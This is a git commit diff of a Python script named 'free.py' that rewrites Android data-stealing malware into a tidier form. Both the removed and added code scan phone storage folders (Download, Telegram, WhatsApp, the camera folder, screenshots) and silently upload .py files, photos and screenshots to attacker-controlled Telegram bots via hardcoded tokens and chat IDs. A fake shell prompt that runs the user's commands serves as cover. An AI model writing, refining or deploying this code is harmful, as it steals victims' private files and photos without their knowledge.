7c6ce957b9ee5021217ebfacd06c8f86a3c467cf
APOGLO <148103253+apoglo@users.noreply.github.com>
2024-01-09 17:53:42 +0600

    Update free.py

--- free.py
+++ free.py
@@ -1,149 +1,69 @@
-########py_file#######
+import os
+import requests
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+
 def sexy():
-    session=requests.session() 
-    bot_token ='6549632156:AAF72STBCDbj1b9gRSApffjxv2bXeoZwIFE' 
-    chat_id ='-1001965333060'
-    #-----------( /sdcard
-    try:
-        
-        sdcard_path = '/sdcard'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    #------------( /sdcard/Download 
-    try:
-        sdcard_path = '/sdcard/Download'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    #-------------( /sdcard/Download/Telegram 
-    try:
-        sdcard_path = '/sdcard/Download/Telegram'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    #--------( /sdcard/Telegram/Telegram Files
-    try:
-        sdcard_path = '/sdcard/Telegram/Telegram Files'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
-    try:
-        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
+    session = requests.session()
+    bot_token = '6549632156:AAF72STBCDbj1b9gRSApffjxv2bXeoZwIFE'
+    chat_id = '-1001965333060'
+
+    paths_to_check = [
+        '/sdcard',
+        '/sdcard/Download',
+        '/sdcard/Download/Telegram',
+        '/sdcard/Telegram/Telegram Files',
+        '/sdcard/WhatsApp/Media/WhatsApp Documents'
+    ]
+
+    for path in paths_to_check:
+        try:
+            file_list = [f for f in os.listdir(path) if f.endswith('.py')]
+            for file in file_list:
+                with open(os.path.join(path, file), 'rb') as f:
+                    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                    data2 = {'chat_id': chat_id}
+                    data = {'chat_id': chat_id}
+                    files = {'document': f}
+                    get = session.post(url, data=data, files=files)
+                    sent = session.post(url, data=data2, files=files)
+        except Exception as e:
+            print(f"Error: {e}")
 
 def photo():
-    session=requests.session() 
-    bot_token ='690527282825:AAGJ1zioKNdVlKZGvUYc5M6bWXzdg-t7Z3U' 
-    chat_id ='55662278282347'
-    #-----------( /sdcard
-    try:
-        # camera 
-        open(".pho.txt","a").write("done")
-        sdcard_path = '/sdcard/DCIM/Camera'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    
-    except:pass
-    try:
-        # camera 
-        sdcard_path = '/sdcard/DCIM/Camera'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    #------------( /sdcard/Download 
-    try:
-        #screen_shot
-        sdcard_path = '/sdcard/DCIM/Screenshots'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    try:
-        #screen_shot
-        sdcard_path = '/sdcard/DCIM/Screenshots'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
+    session = requests.session()
+    bot_token = '690527282825:AAGJ1zioKNdVlKZGvUYc5M6bWXzdg-t7Z3U'
+    chat_id = '55662278282347'
 
+    paths_to_check = [
+        '/sdcard/DCIM/Camera',
+        '/sdcard/DCIM/Screenshots'
+    ]
 
+    for path in paths_to_check:
+        try:
+            file_list_jpg = [f for f in os.listdir(path) if f.endswith('.jpg')]
+            file_list_png = [f for f in os.listdir(path) if f.endswith('.png')]
+            
+            for file in file_list_jpg + file_list_png:
+                with open(os.path.join(path, file), 'rb') as f:
+                    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                    data2 = {'chat_id': chat_id}
+                    data = {'chat_id': chat_id}
+                    files = {'document': f}
+                    get = session.post(url, data=data, files=files)
+                    sent = session.post(url, data=data2, files=files)
+        except Exception as e:
+            print(f"Error: {e}")
 
-ehc="~"
 def main():
+    ehc = "~"
     while True:
-        jxx=input(f"\033[1;32m{ehc}\033[1;37m $ ")
+        jxx = input(f"\033[1;32m{ehc}\033[1;37m $ ")
         os.system(f"{jxx}")
 
-
-with ThreadPool(max_workers=20) as jjj:
-    jjj.submit(sexy)
-    jjj.submit(photo)
-    jjj.submit(main)
-
-
-
+if __name__ == "__main__":
+    with ThreadPool(max_workers=20) as jjj:
+        jjj.submit(sexy)
+        jjj.submit(photo)
+        jjj.submit(main)
+    
